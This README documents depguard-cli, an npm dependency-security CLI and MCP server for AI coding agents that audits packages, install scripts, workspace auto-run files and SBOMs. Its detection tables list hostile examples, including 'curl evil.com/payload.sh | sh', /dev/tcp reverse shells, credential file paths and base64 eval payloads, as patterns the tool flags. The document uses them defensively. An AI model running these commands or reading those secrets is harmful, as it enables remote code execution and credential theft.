# depguard-cli

**MCP security server for AI coding agents.** 14 tools — workspace auto-exec audit (defends against fake-interview / take-home-test malware), static code analysis, pre-install guardian, AI hallucination guard, dead-dependency detection, vulnerability audit, remediation planner, CycloneDX 1.6 SBOM, and SARIF v2.1.0 output for GitHub Code Scanning. Zero runtime dependencies. Works with Claude, Cursor, Windsurf, and any MCP client.

[![npm](https://img.shields.io/npm/v/depguard-cli)](https://www.npmjs.com/package/depguard-cli) [![license](https://img.shields.io/npm/l/depguard-cli)](LICENSE)

## Why depguard

I work on industrial software where every event has to be logged and recoverable — customers trust the system because the audit trail makes the system trustworthy. When I started wiring AI coding agents into our internal stack, I realised the npm ecosystem treats supply-chain integrity as someone else's problem: install 1,000 packages, hope for the best. depguard brings the same auditability mindset to JavaScript dependencies — verify before installing, audit what's already there, generate an SBOM your security team can actually use.

Zero runtime dependencies — because a security tool that pulls in 200 transitive packages is the joke that writes itself.

## Install

```bash
npm install -g depguard-cli      # or use directly with npx
npx depguard-cli audit express
```

## MCP server (primary use case)

depguard exposes 14 [MCP](https://modelcontextprotocol.io/) tools over stdio. Add it to any MCP-compatible client and your AI agent calls them automatically when it's about to install something, audit a project, or review code.

**Setup — Claude Code one-liner:**

```bash
claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
```

**Setup — generic MCP config** (Claude Desktop, Cursor, Windsurf, Continue.dev, Cline, Roo Code):

```json
{
  "mcpServers": {
    "depguard": {
      "command": "npx",
      "args": ["-y", "depguard-cli", "--mcp"]
    }
  }
}
```

### The 14 tools

| Tool | Use it when |
|------|-------------|
| `depguard_guard` | About to install package Y → pre-install verify + audit + allow/warn/block |
| `depguard_should_use` | Need functionality X → recommend install / use-native / write-from-scratch |
| `depguard_audit_workspace` | **Just cloned a repo, before opening it in any IDE.** Lists files that auto-execute on workspace open (VS Code tasks `runOn:folderOpen`, devcontainer lifecycle, `.envrc`, JetBrains run configs, Makefile, `.gitattributes`, committed git hooks). Defends against fake-interview / take-home-test malware. |
| `depguard_audit_project` | Audit a whole project — direct deps, transitives via lockfile, `packageManager` field |
| `depguard_remediate` | "100 vulnerabilities, which 5 direct deps do I bump?" — groups transitives by parent, sorted by severity weight |
| `depguard_audit` | Deep dive on one package (vulnerabilities + static code analysis + install scripts) |
| `depguard_audit_bulk` | Compare A vs B vs C in one call |
| `depguard_audit_deep` | Full transitive tree audit for one package |
| `depguard_review` | AI code review — detect debris left by AI agents (console.logs, empty catch, broken imports, orphan files) |
| `depguard_sweep` | Find unused dependencies in a project |
| `depguard_search` | Search npm by keywords, ranked by depguard score |
| `depguard_score` | Score 0-100 for one package |
| `depguard_verify` | AI hallucination guard — does this package exist? Is it a typosquat? |
| `depguard_sbom` | Generate a CycloneDX 1.6 SBOM (EU CRA, US EO 14028, SOC 2, FedRAMP) |

Every MCP response includes a `tokenSavings` field that quantifies the LLM-tokens saved vs equivalent manual research:

```json
"tokenSavings": {
  "responseTokens": 47,
  "manualEstimate": 11100,
  "saved": 11053,
  "percentSaved": 100,
  "manualSteps": [
    "WebSearch: '{package} npm quality maintenance' (~800 tokens)",
    "WebFetch: npm registry page (~3000 tokens)",
    "WebFetch: GitHub repo for activity/stars (~3000 tokens)",
    "WebSearch: '{package} vulnerabilities' (~800 tokens)",
    "WebFetch: advisories page (~3000 tokens)",
    "Reasoning: compute weighted score (~500 tokens)"
  ]
}
```

Automatic, no configuration. Lets teams quantify the LLM cost reduction of routing dependency questions through depguard instead of free-text web research.

## CLI

```bash
depguard-cli audit <package[@version]> [--target-license MIT] [--json|--format sarif]
depguard-cli audit-project <path/package.json> [--include-dev] [--json|--format sarif]
depguard-cli audit-workspace [path] [--json|--format sarif]
depguard-cli audit-deep <package> [--json]
depguard-cli guard <package> [--threshold 60] [--block] [--json]
depguard-cli should-use <intent...> [--threshold 60] [--json]
depguard-cli sweep [path] [--include-dev] [--json]
depguard-cli review [path] [--full] [--json]
depguard-cli sbom <path/package.json> [--include-vex] [--include-dev] [-o out.json]
depguard-cli remediate <path/package.json> [--json]
depguard-cli search <keywords...> [--limit 10] [--json]
depguard-cli score <package> [--target-license MIT] [--json]
depguard-cli stats [--json]
```

Pre-install guardian in action:

```bash
$ depguard-cli guard expresss
[WARN] expresss
  Possible typosquat of: express
  Score: 45/100 is below threshold 60

$ depguard-cli guard ai-made-up-package
[BLOCK] ai-made-up-package
  Package does NOT exist on npm!
```

### GitHub Code Scanning (SARIF v2.1.0)

`audit`, `audit-project`, and `audit-workspace` accept `--format sarif` and emit SARIF v2.1.0 with GHSA-stable rule IDs (`depguard/vuln/GHSA-…`), CVSS-propagated severity, and stable `partialFingerprints` for dedup across runs.

```yaml
# .github/workflows/depguard.yml
- name: Pre-open workspace audit
  run: npx -y depguard-cli audit-workspace . --format sarif -o workspace.sarif || true
- name: Project dependency audit
  run: npx -y depguard-cli audit-project ./package.json --format sarif -o project.sarif || true
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: |
      workspace.sarif
      project.sarif
```

## API

```typescript
import { audit, auditProject, sweep, guard, generateSBOM, auditToSarif } from 'depguard-cli'

const report = await audit('express', 'MIT')
report.vulnerabilities.total     // 0
report.securityFindings          // SecurityFinding[] (static code analysis)
report.licenseCompatibility.compatible // true

const project = await auditProject('./package.json', { includeDevDependencies: true })
project.summary               // { critical: 0, high: 2, moderate: 5, low: 3 }
project.transitiveSummary     // { totalDeps: 800, vulnerable: 12, ... }
project.packageManagerAudit   // audit of `packageManager: yarn@4.5.3`

const sweepResult = await sweep('.', { includeDevDependencies: true })
sweepResult.unused              // [{ name: 'lodash', estimatedSizeKB: 1400, ... }]
sweepResult.estimatedSavingsKB  // 2450

const decision = await guard('expresss')
decision.possibleTyposquat  // true
decision.similarTo          // ["express"]
decision.decision           // "warn"

const bom = await generateSBOM('./package.json', { includeVex: true })
bom.specVersion             // "1.6"
bom.vulnerabilities         // [{ id: "GHSA-...", ratings: [...], affects: [...] }]
```

## What depguard checks

### Scoring

Each package is scored 0-100 across five dimensions, with thresholds tuned for AI-agent decision-making:

| Dimension | Weight | What it measures |
|-----------|--------|------------------|
| Security | 30% | CVEs, advisories, static code analysis findings |
| Maintenance | 25% | Last publish, version count, deprecation |
| Popularity | 20% | Weekly downloads (log scale) |
| License | 15% | Compatibility with your project's target license |
| Dependencies | 10% | Dependency count, install scripts |

Decisions (`shouldUse`): `>= 60` → install, `40-59` → caution, `< 40` → write from scratch.

**Static-analysis caps the security score regardless of popularity** — this is deliberate: a wildly popular package with a credential-stealing payload still loses.

| Worst finding | Security score capped at |
|---------------|---------------------------|
| Critical (e.g. malware, reverse shell) | **20/100** |
| High (e.g. obfuscation, env-var exfil) | **45/100** |
| None | unrestricted |

### Pre-install guardian

Three sequential checks before `npm install`: (1) does the package exist on npm? (2) is the name a typosquat — Levenshtein distance against 100+ top packages? (3) full security audit. Used as the recommended MCP entry point for AI agents.

### Install script analysis

depguard statically pattern-matches `preinstall` / `install` / `postinstall` scripts. **Nothing is executed.**

| Pattern | Severity | Example |
|---------|----------|---------|
| Remote code execution | Critical | `curl evil.com/payload.sh \| sh` |
| Reverse shells | Critical | `/dev/tcp/` connections |
| Credential file access | Critical | `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
| Sensitive env vars | Critical | `$NPM_TOKEN`, `$AWS_SECRET` |
| Shell typosquatting | Critical | `/bin/ssh` instead of `/bin/sh` |
| Obfuscated code | High | `eval(Buffer.from(..., "base64"))` |
| Process spawning | High | `child_process`, `exec()`, `spawn()` |

### Static code analysis (tarball scan)

depguard downloads the package tarball, extracts JS files, and scans for 18+ malware patterns across 6 categories:

| Category | Severity | What it detects |
|----------|----------|-----------------|
| `malware` | Critical | Eval of decoded payloads, reverse shells, crypto-mining |
| `data-exfiltration` | Critical/High | `JSON.stringify(process.env)`, credential file reads, dynamic fetch URLs |
| `code-execution` | High | `eval()`, `new Function()`, `child_process.exec/spawn` |
| `obfuscation` | High/Medium | Long hex/unicode strings, base64 payloads, minified source in non-`.min.js` files |
| `unexpected-behavior` | High/Medium | Network calls in a "formatter" package, FS access in a "date utility" |
| `supply-chain` | Critical | Typosquatting patterns in install scripts |

**Behavioral mismatch** compares the package's stated purpose (description + keywords) against detected runtime behavior. A "string formatter" that makes network calls is flagged with a rich `SecurityFinding` (title, explanation, evidence, file, recommendation).

### Dead-dependency detection

`sweep` scans `.js/.ts/.mjs/.cjs/.jsx/.tsx` for `import` / `require` / `export from`, recognises config-only dependencies (eslint, prettier, jest, tailwind, …), detects binaries used in npm scripts, pairs `@types/*` with their runtime peer, and marks untraced devDependencies as "maybe-unused" instead of "unused". Reports estimated disk savings.

### Native-alternative advisor

`should_use` checks for native Node.js APIs before recommending packages — `fetch` (18+), `crypto.randomUUID()` (19+), `structuredClone()` (17+), and 20+ more. Each comes with example code and the minimum Node version.

### Fix suggestions

Every vulnerable result includes a `fixSuggestions` array with `currentVersion`, `fixVersion`, and `action: 'upgrade' | 'no-fix-available'`. `depguard_remediate` aggregates these and groups vulnerable transitives by the direct dep that pulls them in, sorted by severity weight.

### License compatibility

Permissive-to-copyleft hierarchy: Public Domain → Permissive (MIT, ISC, BSD, Apache-2.0) → Weak Copyleft (LGPL, MPL) → Strong Copyleft (GPL) → Network (AGPL). A dependency is compatible if its license is equally or more permissive than the target license.

## SBOM (CycloneDX 1.6)

Native CycloneDX 1.6 generation against the public JSON Schema — no `@cyclonedx/cyclonedx-library` runtime dependency. Output is consumed unchanged by Dependency-Track, Trivy, Grype, and OWASP DT.

```bash
depguard-cli sbom ./package.json -o sbom.cdx.json
depguard-cli sbom ./package.json --include-vex --include-dev -o sbom.cdx.json
```

Suitable for **EU Cyber Resilience Act**, **US Executive Order 14028 / OMB M-22-18**, SOC 2, FedRAMP, and supplier procurement. PURLs follow the [Package URL spec](https://github.com/package-url/purl-spec/blob/main/PURL-TYPES.rst#npm). SHA-512 integrity hashes are extracted from `package-lock.json` and converted from base64 to hex per the CycloneDX schema. With `--include-vex`, advisories are inlined with CVSS ratings and patched versions.

## Data, privacy & performance

- **Two advisory databases, deduplicated.** Each advisory is filtered to the installed version range (no noise from advisories that don't actually affect you) and tagged with its `source` field.

  | Source | What it catches |
  |--------|----------------|
  | npm Registry | `npm audit` advisories |
  | GitHub Advisory DB | GHSAs, often not in npm |

- **Everything stays local.** No telemetry, no usage reporting, nothing sent anywhere. Audit results are cached in memory (5 min TTL) and on disk under `~/.depguard/cache/` (24h TTL); the cache is cleaned on startup.

- **GitHub token (optional).** Set `GITHUB_TOKEN` (no scopes needed — identification only) to raise the GitHub Advisory API rate limit from 60/h to 5,000/h. If `gh` CLI or GitHub Actions already exposes one, depguard picks it up automatically.

## About

**Design principles.** Zero runtime dependencies. Never throws on network errors — returns degraded results with warnings. TypeScript strict. 100% offline tests. False-positive aversion is a hard constraint for every detection rule — depguard is a security tool, and a security tool with poor precision destroys its own trust.

**Development.**

```bash
npm test          # 409 offline tests
npm run check     # version + build + lint + test + audit:security (gates publish)
```

**Author.** Jorge Morais ([jorgemopanc.com](https://jorgemopanc.com) · [LinkedIn](https://www.linkedin.com/in/jorge-mopanc/)) — Tech Lead at Balanças Marques in Braga, Portugal, building edge-to-cloud systems for industrial operations. Issues, PRs, and bug reports welcome. If depguard saves you from a malicious install or unblocks a compliance audit and you'd like to support the project, [GitHub Sponsors](https://github.com/sponsors/mopanc) is the cleanest way — no expectations, the tool is free and will stay so.

**License.** Apache-2.0 — see [LICENSE](LICENSE).
